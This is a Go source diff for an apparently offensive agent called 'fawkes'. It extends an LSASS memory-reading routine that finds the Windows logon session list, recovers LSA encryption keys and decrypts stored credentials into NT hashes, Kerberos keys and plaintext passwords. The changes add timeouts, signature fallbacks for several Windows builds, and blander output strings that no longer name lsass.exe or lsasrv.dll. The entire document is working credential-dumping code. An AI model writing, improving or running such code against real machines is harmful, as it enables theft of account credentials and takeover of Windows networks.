@@ -12,11 +12,21 @@ import (
 	"encoding/json"
 	"fmt"
 	"strings"
+	"time"
 
 	"fawkes/pkg/structs"
 
 	"golang.org/x/sys/windows"
 )
+
+func layoutForVariant(variant string) logonSessionLayout {
+	switch variant {
+	case "Win10_1507_Server2016", "Win10_1703", "Win10_1803_Server2019", "Win10_1903_21H1":
+		return LayoutWin10Original
+	default:
+		return LayoutWin10New
+	}
+}
 
 // lsassRemoteReader implements the cross-platform lsassReader interface
 // against a live PROCESS_VM_READ handle.
@@ -29,8 +39,31 @@ func (r lsassRemoteReader) Read(addr uintptr, size uint32) ([]byte, error) {
 }
 
 // executeInsituFull runs the full Phase 2B credential-discovery flow and
-// returns a structured CommandResult.
+// returns a structured CommandResult. The operation runs with a 60-second
+// timeout to prevent the agent from hanging if LSASS reads block.
 func executeInsituFull() structs.CommandResult {
+	type result struct {
+		cr structs.CommandResult
+	}
+	ch := make(chan result, 1)
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				ch <- result{cr: errorf("hash extraction crashed unexpectedly")}
+			}
+		}()
+		ch <- result{cr: executeInsituFullInner()}
+	}()
+
+	select {
+	case r := <-ch:
+		return r.cr
+	case <-time.After(60 * time.Second):
+		return errorf("Phase 2B: operation timed out after 60s (likely hung on ReadProcessMemory)")
+	}
+}
+
+func executeInsituFullInner() structs.CommandResult {
 	phase1, err := enumerateInsituSessions()
 	if err != nil {
 		return errorf("Phase 1 LSA enumeration failed: %v", err)
@@ -51,11 +84,11 @@ func executeInsituFull() structs.CommandResult {
 
 	pid, err := lsassFindPID()
 	if err != nil {
-		return errorf("Phase 2B: locate lsass.exe: %v", err)
+		return errorf("Phase 2B: locate target process: %v", err)
 	}
 	h, err := lsassOpenForRead(pid)
 	if err != nil {
-		return errorf("Phase 2B: open lsass.exe pid=%d: %v\n[!] Detected protection state: %s\n[!] %s",
+		return errorf("Phase 2B: open target process pid=%d: %v\n[!] Detected protection state: %s\n[!] %s",
 			pid, err, protection.Summary(), protection.AccessDeniedHint())
 	}
 	defer windows.CloseHandle(h)
@@ -67,104 +100,44 @@ func executeInsituFull() structs.CommandResult {
 
 	lsasrvBytes, err := lsassReadModuleBytes(h, mod)
 	if err != nil {
-		return errorf("Phase 2B: read lsasrv.dll image (base=0x%X size=%d): %v", mod.Base, mod.Size, err)
-	}
-	anchor, err := findLogonSessionListAnchor(lsasrvBytes, mod.Base)
-	if err != nil {
-		return errorf("Phase 2B: %v", err)
+		return errorf("Phase 2B: read target module image (base=0x%X size=%d): %v", mod.Base, mod.Size, err)
 	}
 
 	reader := lsassRemoteReader{h: h}
-	cryptoLayout := LsaCryptoWin10W8
-	cryptoReport, cryptoMaterial, cryptoErrStr := captureLsaCrypto(reader, lsasrvBytes, mod.Base, cryptoLayout)
+
+	anchor, sigVariant, err := findValidatedAnchor(lsasrvBytes, mod.Base, reader)
+	if err != nil {
+		return errorf("Phase 2B: %v", err)
+	}
+	cryptoReport, cryptoMaterial, cryptoLayoutName, cryptoErrStr := findBestCryptoLayout(reader, lsasrvBytes, mod.Base)
 	canDecrypt := cryptoMaterial.HasAESKey() || cryptoMaterial.HasDESKey()
 
-	layout := LayoutWin10W8
+	layout := layoutForVariant(sigVariant)
 	nodes, walkErr := walkLogonSessionList(reader, anchor, layout.NodeReadSize, 64)
 
 	matchedLUIDs := make(map[uint64]bool, len(luidIndex))
 	reports := make([]insituFullNodeReport, 0, len(nodes))
-	matchedNodes := 0
-	structParsed := 0
-	nodesWithCreds := 0
-	credBlobsCaptured := 0
-	credBlobsDecrypted := 0
-	hashesExtracted := 0
+	var matchedNodes, structParsed, nodesWithCreds int
+	var credBlobsCaptured, credBlobsDecrypted, hashesExtracted, kerbKeysExtracted, ptCredsExtracted int
 	dumpLines := make([]string, 0, 8)
 	for _, n := range nodes {
-		preview := 32
-		if len(n.Raw) < preview {
-			preview = len(n.Raw)
-		}
-		report := insituFullNodeReport{
-			Address:       fmt.Sprintf("0x%X", n.Address),
-			Flink:         fmt.Sprintf("0x%X", n.Flink),
-			Blink:         fmt.Sprintf("0x%X", n.Blink),
-			RawPreviewHex: hex.EncodeToString(n.Raw[:preview]),
-		}
-		parsed := parseLogonSessionFields(reader, n.Raw, layout)
-		if parsed.LUID != 0 {
+		result := processInsituLogonNode(n, layout, reader, luidIndex, luidsOrdered, matchedLUIDs, canDecrypt, cryptoMaterial)
+		if result.structParsed {
 			structParsed++
-			report.ParsedLUID = fmt.Sprintf("0x%016X", parsed.LUID)
 		}
-		report.ParsedUserName = parsed.UserName
-		report.ParsedDomain = parsed.Domain
-		report.ParsedAuthPkg = parsed.AuthPackage
-		report.ParsedLogonSrv = parsed.LogonServer
-		if name := logonSessionTypeName(parsed.LogonType); name != "" {
-			report.ParsedLogonType = name
-		}
-		if parsed.CredentialsPtr != 0 {
-			report.CredentialsPtr = fmt.Sprintf("0x%X", parsed.CredentialsPtr)
-		}
-		report.ParseErrors = parsed.ParseErrors
-
-		if parsed.LUID != 0 {
-			if _, ok := luidIndex[parsed.LUID]; ok {
-				matchedLUIDs[parsed.LUID] = true
-				report.Phase1Match = true
-				report.Phase1Source = "structured"
-				for _, sess := range luidIndex[parsed.LUID] {
-					report.MatchedUsers = append(report.MatchedUsers,
-						fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
-				}
-			}
-		}
-		if !report.Phase1Match {
-			for _, luid := range luidsOrdered {
-				if !scanRawForLUID(n.Raw, luid) {
-					continue
-				}
-				matchedLUIDs[luid] = true
-				report.Phase1Match = true
-				report.Phase1Source = "byte-scan-fallback"
-				for _, sess := range luidIndex[luid] {
-					report.MatchedUsers = append(report.MatchedUsers,
-						fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
-				}
-				break
-			}
-		}
-		if report.Phase1Match {
+		if result.matched {
 			matchedNodes++
 		}
-
-		if parsed.CredentialsPtr != 0 {
-			creds, walkErr := walkCredentialList(reader, parsed.CredentialsPtr, credentialListMaxEntries)
-			if walkErr != nil {
-				report.CredentialWalkErr = walkErr.Error()
-			}
-			if len(creds) > 0 {
-				nodesWithCreds++
-				report.Credentials = make([]insituFullCredentialReport, 0, len(creds))
-				for _, c := range creds {
-					credReport := buildCredentialReport(c, canDecrypt, cryptoMaterial, &credBlobsCaptured, &credBlobsDecrypted, &hashesExtracted, &dumpLines)
-					report.Credentials = append(report.Credentials, credReport)
-				}
-			}
+		if result.hasCreds {
+			nodesWithCreds++
 		}
-
-		reports = append(reports, report)
+		credBlobsCaptured += result.credBlobsCaptured
+		credBlobsDecrypted += result.credBlobsDecrypted
+		hashesExtracted += result.hashesExtracted
+		kerbKeysExtracted += result.kerbKeysExtracted
+		ptCredsExtracted += result.ptCredsExtracted
+		dumpLines = append(dumpLines, result.dumpLines...)
+		reports = append(reports, result.report)
 	}
 
 	var unmatched []string
@@ -182,7 +155,7 @@ func executeInsituFull() structs.CommandResult {
 		LsasrvSize:               mod.Size,
 		AnchorAddr:               fmt.Sprintf("0x%X", anchor),
 		StructLayout:             layout.Name,
-		CryptoLayout:             cryptoLayout.Name,
+		CryptoLayout:             cryptoLayoutName,
 		PrimaryCredentialLayout:  PrimaryCredential10NewLayout.Name,
 		LsaCrypto:                cryptoReport,
 		LsaCryptoErr:             cryptoErrStr,
@@ -193,6 +166,8 @@ func executeInsituFull() structs.CommandResult {
 		CredentialBlobsCaptured:  credBlobsCaptured,
 		CredentialBlobsDecrypted: credBlobsDecrypted,
 		HashesExtracted:          hashesExtracted,
+		KerberosKeysExtracted:    kerbKeysExtracted,
+		PlaintextCredsExtracted:  ptCredsExtracted,
 		UnmatchedLUIDs:           unmatched,
 		Nodes:                    reports,
 	}
@@ -202,22 +177,152 @@ func executeInsituFull() structs.CommandResult {
 		return errorf("Phase 2B: marshal summary: %v", err)
 	}
 
-	sb := formatInsituFullOutput(phase1, protection, pid, mod, anchor, walkErr, nodes, layout,
+	header := formatInsituFullOutput(phase1, protection, pid, mod, anchor, walkErr, nodes, layout,
 		structParsed, matchedLUIDs, luidsOrdered, nodesWithCreds, credBlobsCaptured,
-		cryptoErrStr, cryptoReport, hashesExtracted, dumpLines)
-	sb.WriteString("\n")
-	sb.WriteString(string(jsonBytes))
-	return successResult(sb.String())
+		cryptoErrStr, cryptoReport, hashesExtracted, kerbKeysExtracted, ptCredsExtracted, dumpLines)
+	return successResult(header + "\n" + string(jsonBytes))
+}
+
+func findBestCryptoLayout(reader lsassReader, lsasrvBytes []byte, modBase uintptr) (*insituFullCryptoReport, lsaCryptoMaterial, string, string) {
+	var cryptoReport *insituFullCryptoReport
+	var cryptoMaterial lsaCryptoMaterial
+	var cryptoLayoutName string
+	var cryptoErrs []string
+	for _, cl := range lsaCryptoLayouts {
+		report, material, errStr := captureLsaCrypto(reader, lsasrvBytes, modBase, cl)
+		if material.HasAESKey() || material.HasDESKey() {
+			return report, material, cl.Name, ""
+		}
+		if errStr != "" {
+			cryptoErrs = append(cryptoErrs, cl.Name+": "+errStr)
+		}
+		if report != nil && cryptoReport == nil {
+			cryptoReport = report
+			cryptoLayoutName = cl.Name
+		}
+	}
+	cryptoErrStr := ""
+	if len(cryptoErrs) > 0 {
+		cryptoErrStr = strings.Join(cryptoErrs, "; ")
+	}
+	return cryptoReport, cryptoMaterial, cryptoLayoutName, cryptoErrStr
+}
+
+type insituNodeResult struct {
+	report             insituFullNodeReport
+	structParsed       bool
+	matched            bool
+	hasCreds           bool
+	credBlobsCaptured  int
+	credBlobsDecrypted int
+	hashesExtracted    int
+	kerbKeysExtracted  int
+	ptCredsExtracted   int
+	dumpLines          []string
+}
+
+func processInsituLogonNode(n logonListNode, layout logonSessionLayout, reader lsassReader,
+	luidIndex map[uint64][]insituSession, luidsOrdered []uint64, matchedLUIDs map[uint64]bool,
+	canDecrypt bool, cryptoMaterial lsaCryptoMaterial) insituNodeResult {
+	preview := 64
+	if len(n.Raw) < preview {
+		preview = len(n.Raw)
+	}
+	report := insituFullNodeReport{
+		Address:       fmt.Sprintf("0x%X", n.Address),
+		Flink:         fmt.Sprintf("0x%X", n.Flink),
+		Blink:         fmt.Sprintf("0x%X", n.Blink),
+		RawPreviewHex: hex.EncodeToString(n.Raw[:preview]),
+	}
+	parsed := parseLogonSessionFields(reader, n.Raw, layout)
+	var result insituNodeResult
+	if parsed.LUID != 0 {
+		result.structParsed = true
+		report.ParsedLUID = fmt.Sprintf("0x%016X", parsed.LUID)
+	}
+	report.ParsedUserName = parsed.UserName
+	report.ParsedDomain = parsed.Domain
+	report.ParsedAuthPkg = parsed.AuthPackage
+	report.ParsedLogonSrv = parsed.LogonServer
+	if name := logonSessionTypeName(parsed.LogonType); name != "" {
+		report.ParsedLogonType = name
+	}
+	if parsed.CredentialsPtr != 0 {
+		report.CredentialsPtr = fmt.Sprintf("0x%X", parsed.CredentialsPtr)
+	}
+	report.ParseErrors = parsed.ParseErrors
+
+	if parsed.LUID != 0 {
+		if _, ok := luidIndex[parsed.LUID]; ok {
+			matchedLUIDs[parsed.LUID] = true
+			report.Phase1Match = true
+			report.Phase1Source = "structured"
+			for _, sess := range luidIndex[parsed.LUID] {
+				report.MatchedUsers = append(report.MatchedUsers,
+					fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
+			}
+		}
+	}
+	if !report.Phase1Match {
+		for _, luid := range luidsOrdered {
+			if !scanRawForLUID(n.Raw, luid) {
+				continue
+			}
+			matchedLUIDs[luid] = true
+			report.Phase1Match = true
+			report.Phase1Source = "byte-scan-fallback"
+			for _, sess := range luidIndex[luid] {
+				report.MatchedUsers = append(report.MatchedUsers,
+					fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
+			}
+			break
+		}
+	}
+	result.matched = report.Phase1Match
+
+	if parsed.CredentialsPtr != 0 {
+		creds, walkErr := walkCredentialList(reader, parsed.CredentialsPtr, credentialListMaxEntries)
+		if walkErr != nil {
+			report.CredentialWalkErr = walkErr.Error()
+		}
+		if len(creds) > 0 {
+			result.hasCreds = true
+			report.Credentials = make([]insituFullCredentialReport, 0, len(creds))
+			sessionUser := parsed.UserName
+			if sessionUser == "" && len(report.MatchedUsers) > 0 {
+				for _, sess := range luidIndex[parsed.LUID] {
+					if sess.Username != "" {
+						sessionUser = sess.Username
+						break
+					}
+				}
+			}
+			for _, c := range creds {
+				credReport := buildCredentialReport(c, canDecrypt, cryptoMaterial, sessionUser,
+					&result.credBlobsCaptured, &result.credBlobsDecrypted, &result.hashesExtracted,
+					&result.kerbKeysExtracted, &result.ptCredsExtracted, &result.dumpLines)
+				report.Credentials = append(report.Credentials, credReport)
+			}
+		}
+	}
+
+	result.report = report
+	return result
 }
 
 // buildCredentialReport constructs a single credential report entry, performing
-// decryption if key material is available. Counters are updated in-place.
+// decryption if key material is available. sessionUser is the logon session's
+// username (from Phase 2C-i), used for dump line generation since the
+// PRIMARY_CREDENTIALS envelope's Primary field is the auth package name, not
+// the user's login name. Counters are updated in-place.
 func buildCredentialReport(c credentialListEntry, canDecrypt bool, material lsaCryptoMaterial,
-	blobsCaptured, blobsDecrypted, hashes *int, dumpLines *[]string) insituFullCredentialReport {
+	sessionUser string, blobsCaptured, blobsDecrypted, hashes, kerbKeys, ptCreds *int,
+	dumpLines *[]string) insituFullCredentialReport {
 	credReport := insituFullCredentialReport{
 		Address:       fmt.Sprintf("0x%X", c.Address),
 		AuthPackageId: c.AuthPackageId,
 		AuthPackage:   c.AuthPackageName,
+		RawHex:        c.RawHex,
 	}
 	if c.PrimaryCredentialsDataPtr != 0 {
 		credReport.PrimaryCredsAddr = fmt.Sprintf("0x%X", c.PrimaryCredentialsDataPtr)
@@ -241,7 +346,9 @@ func buildCredentialReport(c credentialListEntry, canDecrypt bool, material lsaC
 			*blobsCaptured++
 
 			if canDecrypt {
-				dec, line := decryptCredentialBlob(material, c.Primary.EncryptedBytes, c.Primary.UserName)
+				credName := c.Primary.UserName
+				dec, line := decryptCredentialBlob(material, c.Primary.EncryptedBytes, sessionUser,
+					credName, c.Primary.EncryptedAddress)
 				credReport.Decrypted = dec
 				if dec != nil && dec.ParseErr != "" {
 					credReport.DecryptErr = dec.ParseErr
@@ -250,12 +357,54 @@ func buildCredentialReport(c credentialListEntry, canDecrypt bool, material lsaC
 					*blobsDecrypted++
 					*hashes++
 				}
+				if dec != nil && len(dec.KerberosKeys) > 0 {
+					*kerbKeys += len(dec.KerberosKeys)
+				}
+				if dec != nil && dec.PlaintextPassword != "" {
+					*ptCreds++
+				}
 				if line != "" {
 					*dumpLines = append(*dumpLines, line)
 				}
 			}
 		}
 		credReport.ParseErrors = c.Primary.ParseErrors
+	}
+
+	// Process additional entries in the PRIMARY_CREDENTIALS chain.
+	if len(c.PrimaryEntries) > 1 && canDecrypt {
+		for _, pe := range c.PrimaryEntries[1:] {
+			entryReport := insituFullPrimaryCredEntryReport{
+				CredentialName: pe.UserName,
+			}
+			if pe.EncryptedAddress != 0 {
+				entryReport.EncryptedAddress = fmt.Sprintf("0x%X", pe.EncryptedAddress)
+			}
+			entryReport.EncryptedLength = pe.EncryptedLength
+			if len(pe.EncryptedBytes) > 0 {
+				*blobsCaptured++
+				dec, line := decryptCredentialBlob(material, pe.EncryptedBytes, sessionUser,
+					pe.UserName, pe.EncryptedAddress)
+				entryReport.Decrypted = dec
+				if dec != nil && dec.ParseErr != "" {
+					entryReport.DecryptErr = dec.ParseErr
+				}
+				if dec != nil && dec.NtHashHex != "" {
+					*blobsDecrypted++
+					*hashes++
+				}
+				if dec != nil && len(dec.KerberosKeys) > 0 {
+					*kerbKeys += len(dec.KerberosKeys)
+				}
+				if dec != nil && dec.PlaintextPassword != "" {
+					*ptCreds++
+				}
+				if line != "" {
+					*dumpLines = append(*dumpLines, line)
+				}
+			}
+			credReport.AdditionalEntries = append(credReport.AdditionalEntries, entryReport)
+		}
 	}
 	return credReport
 }
@@ -268,13 +417,13 @@ func formatInsituFullOutput(phase1 []insituSession, protection LsassProtectionSt
 	structParsed int, matchedLUIDs map[uint64]bool, luidsOrdered []uint64,
 	nodesWithCreds, credBlobsCaptured int,
 	cryptoErrStr string, cryptoReport *insituFullCryptoReport,
-	hashesExtracted int, dumpLines []string) strings.Builder {
+	hashesExtracted, kerbKeysExtracted, ptCredsExtracted int, dumpLines []string) string {
 
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("[+] Phase 1 LSA enumeration: %d session(s)\n", len(phase1)))
 	sb.WriteString(fmt.Sprintf("[+] LSASS protection: %s\n", protection.Summary()))
-	sb.WriteString(fmt.Sprintf("[+] LSASS pid=%d, lsasrv.dll @ 0x%X (size %d bytes)\n", pid, mod.Base, mod.Size))
-	sb.WriteString(fmt.Sprintf("[+] LogonSessionList anchor: 0x%X\n", anchor))
+	sb.WriteString(fmt.Sprintf("[+] Target pid=%d, module @ 0x%X (size %d bytes)\n", pid, mod.Base, mod.Size))
+	sb.WriteString(fmt.Sprintf("[+] Session list anchor: 0x%X\n", anchor))
 	if walkErr != nil {
 		sb.WriteString(fmt.Sprintf("[!] Walk terminated early: %v (collected %d node(s))\n", walkErr, len(nodes)))
 	} else {
@@ -291,8 +440,8 @@ func formatInsituFullOutput(phase1 []insituSession, protection LsassProtectionSt
 			cryptoReport.H3DesGlobal, bcryptCbSecret(cryptoReport.H3DesKey),
 			cryptoReport.HAesGlobal, bcryptCbSecret(cryptoReport.HAesKey)))
 	}
-	sb.WriteString(fmt.Sprintf("[+] Decryption: %d blob(s) yielded an MSV1_0 NT hash (%s layout) — Phase 2C-ii-c\n",
-		hashesExtracted, PrimaryCredential10NewLayout.Name))
+	sb.WriteString(fmt.Sprintf("[+] Decryption: %d NT hash(es), %d Kerberos key(s), %d plaintext credential(s)\n",
+		hashesExtracted, kerbKeysExtracted, ptCredsExtracted))
 
 	if len(dumpLines) > 0 {
 		sb.WriteString("\n")
@@ -301,7 +450,7 @@ func formatInsituFullOutput(phase1 []insituSession, protection LsassProtectionSt
 			sb.WriteString("\n")
 		}
 	}
-	return sb
+	return sb.String()
 }
 
 // bcryptCbSecret returns the resolved cbSecret of a BCrypt key report or 0
@@ -311,4 +460,51 @@ func bcryptCbSecret(r *insituFullBcryptKeyReport) uint32 {
 		return 0
 	}
 	return r.CbSecret
+}
+
+// findValidatedAnchor tries each LogonSessionList signature variant, resolves
+// the candidate anchor address, then validates it by reading the LIST_ENTRY
+// from LSASS and checking that the pointers look reasonable. This prevents
+// false-positive pattern matches from producing bad anchors that hang the walk.
+func findValidatedAnchor(lsasrvBytes []byte, lsasrvBase uintptr, reader lsassReader) (uintptr, string, error) {
+	var diag []string
+	for _, v := range logonSessionListVariants {
+		pat, mask, err := parseHexPattern(v.Signature)
+		if err != nil {
+			diag = append(diag, fmt.Sprintf("%s: bad pattern: %v", v.Name, err))
+			continue
+		}
+		hit := findPattern(lsasrvBytes, pat, mask)
+		if hit < 0 {
+			continue
+		}
+		movStart := hit + v.MovInstrOffset
+		if movStart < 0 || movStart+v.MovInstrLen > len(lsasrvBytes) {
+			diag = append(diag, fmt.Sprintf("%s: MOV outside buffer", v.Name))
+			continue
+		}
+		target, _, ok := resolveRIPRelative(lsasrvBytes, movStart, v.MovDispFieldOffs, v.MovInstrLen)
+		if !ok {
+			diag = append(diag, fmt.Sprintf("%s: RIP target outside buffer", v.Name))
+			continue
+		}
+		candidate := lsasrvBase + uintptr(target)
+
+		head, err := readListEntry(reader, candidate)
+		if err != nil {
+			diag = append(diag, fmt.Sprintf("%s: anchor 0x%X unreadable: %v", v.Name, candidate, err))
+			continue
+		}
+		if !isPlausibleUserModePtr(head.Flink) || !isPlausibleUserModePtr(head.Blink) {
+			diag = append(diag, fmt.Sprintf("%s: anchor 0x%X has bad pointers (Flink=0x%X Blink=0x%X)", v.Name, candidate, head.Flink, head.Blink))
+			continue
+		}
+		return candidate, v.Name, nil
+	}
+	return 0, "", fmt.Errorf("session list: no variant produced a valid anchor in %d-byte target module (%d variants tried); diagnostics: %s",
+		len(lsasrvBytes), len(logonSessionListVariants), strings.Join(diag, "; "))
+}
+
+func isPlausibleUserModePtr(addr uintptr) bool {
+	return addr >= 0x10000 && addr < 0x7FFFFFFFFFFF
 }
